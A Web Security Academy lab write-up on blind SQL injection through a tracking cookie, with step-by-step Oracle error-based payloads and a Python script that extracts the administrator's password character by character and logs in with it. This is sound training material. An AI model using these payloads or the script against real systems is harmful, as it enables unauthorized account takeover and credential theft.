'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

1. Vulnerability:  Tracking Cookie (Blind SQLi)

2. Goal: 1. Enumerate the Administrator's Password
         2. Log in the administrator Account

3 Analysis: 1. Confirming the parameter is vulnerable
            * Backend Query: SELECT trackingid from trackingtable where trackignid = '<id>'
                ' ||(SELECT '') || '    # ERROR Not MYSql Database
                ' || (SELECT '' FROM DUAL) || ' # NO ERROR (ORACLE DATABASE)
            
                     
            2. Confirming if the User table Exists
                ' || (SELECT '' FROM users WHERE ROWNUM=1) || ' #Confirmed users Table Exits!

            3. Confirm the username administrator exits
                
                ' || (SELECT '' FROM users WHERE username='administrator') || ' #200 OK 

                ' || (SELECT '' FROM users WHERE username='hjcfubf78gfiu') || ' #200 OK ??

                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
                    ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL) ||'

                        ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = 'administrator') ||'    #500 INTERNAL SERVER ERROR

                        ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = 'hjkvdcjhk') ||'    #200 OK , Hence the username is not there 


                        * Order of EXECUTION:
                            FROM  -> SELECT  # Hence it will check the username first the it will run the select portion

                # 500 INTERNAL SERVER ERROR Confirmed username administrator exists!

            4. Confirming the length of the administrator's Password:
                ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = 'administrator' and LENGTH(password)=20 ) ||'  # 500 INTERNAL SERVER ERROR -> 20 Characters

            6. Enumerating the administrator password character by character

                ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = 'administrator' and SUBSTR(password, 1, 1)='z' ) || '  # 500 INTERNAL SERVER ERROR, Hence First Character is 'z'

                Similarly making the whole password: 
                    
                    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
                    z p b l 5 s t 2 o  c  p  q  6  8  p  l  x t  u  q

                    zpbl5st2ocpq68plxtuq

                
            
4. Exploit: ;)



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-12/sqli-lab-12.py

'''


import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup  # Ensure you have BeautifulSoup installed

# Disable warnings for insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy for HTTP requests (if needed)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Helper function to send the payload and return the response
def send_payload(url, cookies):
    try:
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    except:
        # If there's an issue with the proxy, send the request without it
        response = requests.get(url, cookies=cookies, verify=False)
    return response

# Function to extract the administrator's password using SQL injection
def extract_admin_password(url, tracking_id, session_id):
    password_extracted = ""  # Initialize an empty string to store the extracted password
    
    # Loop through the length of the password (assumed to be 20 characters)
    for char_position in range(1, 21):
        for ascii_value in range(32, 126):  # Loop through possible ASCII values for characters
            # Construct the SQL injection payload to retrieve the character at the current position
            sql_injection_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = 'administrator' and ASCII(SUBSTR(password, %s, 1))='%s' ) || '" % (char_position, ascii_value)
            payload_encoded = urllib.parse.quote(sql_injection_payload)  # URL encode the payload
            
            # Set cookies with the dynamically retrieved tracking ID and session ID
            cookies = {
                'TrackingId': tracking_id + payload_encoded, 
                'session': session_id
            }
            
            # Send the request with the constructed cookies
            response = send_payload(url, cookies)
            
            # Check if the status code not equal to 500
            if response.status_code!=500:
                sys.stdout.write('\r' + password_extracted + chr(ascii_value))
                sys.stdout.flush()  # Flush the output to update the display
            else:
                # If welcome message is found, add the character to the extracted password
                password_extracted += chr(ascii_value)
                sys.stdout.write('\r' + password_extracted)  # Display the current password
                sys.stdout.flush()
            
            # If the password length reaches 20, display the complete password and attempt to log in
            if len(password_extracted) == 20:
                print(f"\n[+] The administrator password is: {password_extracted}")
                # Attempt to log in as the administrator
                if login_as_admin(requests.Session(), url + "/login", password_extracted):
                    print("[+] SQL injection successful! Logged in as Administrator :)")
                else:
                    print("[-] SQL injection unsuccessful!")    
                return  # Exit the function once the password is found

    # If the process fails, indicate failure to retrieve credentials
    print("[-] Failed to retrieve administrator credentials.")

# Function to get the initial cookie values (TrackingId and session)
def get_initial_cookies(url):
    try:
        response = requests.get(url, verify=False, proxies=proxies)
    except:
        response = requests.get(url, verify=False)
    
    # Extract cookies from the response
    tracking_id = response.cookies.get('TrackingId', '')
    session_id = response.cookies.get('session', '')

    # Check if cookies were retrieved successfully
    if not tracking_id or not session_id:
        print("[-] Failed to retrieve cookies from the target website.")
        sys.exit(1)  # Exit if cookies are not found

    return tracking_id, session_id

# Function to get CSRF token from the login page
def get_csrf_token(session, url):
    try:
        response = session.get(url, verify=False, proxies=proxies)
    except: 
        response = session.get(url, verify=False)

    # Parse the response to find the CSRF token
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input")['value']
    return csrf_token

# Function to log in as the administrator using the extracted password
def login_as_admin(session, url_login, admin_password):
    csrf_token = get_csrf_token(session, url_login)  # Get CSRF token
    login_data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": admin_password
    }
    
    try:
        # Send a POST request to log in
        response = session.post(url_login, data=login_data, verify=False, proxies=proxies)
    except:
        response = session.post(url_login, data=login_data, verify=False)

    # Check if login was successful by looking for the logout message
    if "Log out" in response.text:
        return True  # Return true if logged in successfully
    else:
        return False  # Return false if login failed

# Main function to execute the SQL injection attack
def main(): 
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        # Edit The url
        url = 'https://0ad4003e04f008e2814ded7900e500df.web-security-academy.net'  # Update Domain here  
    
    print("(+) Retrieving initial cookies from the website...")
    tracking_id, session_id = get_initial_cookies(url)  # Retrieve the cookies dynamically

    print("(+) Retrieving administrator password...")
    extract_admin_password(url, tracking_id, session_id)  # Start the password extraction process

# Run the main function when the script is executed
if __name__ == "__main__":
    main()

